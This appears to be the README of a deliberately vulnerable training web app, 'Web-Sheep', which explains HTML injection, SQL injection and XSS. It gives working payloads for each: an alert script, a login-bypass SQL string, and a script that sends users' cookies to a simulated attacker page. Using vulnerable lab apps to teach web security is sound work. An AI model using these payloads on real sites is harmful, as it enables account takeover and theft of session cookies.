# web_sheep
Welcome to 'Web-Sheep - A Vulnerable Web-App!'
This was created to demonstrate some basic but dangerous vulnerabilities that can be occasionally found in web-pages. Refer to 'database_setup.txt' in 'bobs_website' for instructions to setup the database in your system.

1. HTML(Code) Injection

Code injection is the exploitation of a computer bug that is caused by processing invalid data. Injection is used by an attacker to introduce (or "inject") code into a vulnerable computer program and change the course of execution.

↓Script to cause an alert in the browser saying 'You have been hacked!'. This will be seen by any user to attempts to view the Bob's(The Website Owner). Paste this in the content area of 'Create Post'.

/*
    <script>alert( 'You have been hacked!' );</script>
*/


2. SQL Injection

SQL injection takes advantage of the syntax of SQL to inject commands that can read or modify a database, or compromise the meaning of the original query.

↓Code to log into any user's account. This causes the query to return the account details of the user with the mentioned 'user_id'. Paste this into the 'Email' section of the 'Login' page.

/*
    " OR user_id=3;
*/


3. XSS Attack

XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

↓Script to steal a user's cookies. This will send any user's remember cookie to Mallory's(The Hacker) website using GET parameters which can then be used by Mallory to gain access to their account. Paste this in the content area of 'Create Post'. Type in the location of the 'web_sheep' directory in place of (location).

/*
    <script>document.write('&lt;img src=&quot;http://localhost/(location)/web_sheep/mallorys_website/cookiestealer.php?cookie='+escape(document.cookie)+'&quot; hidden&gt;');</script>
*/
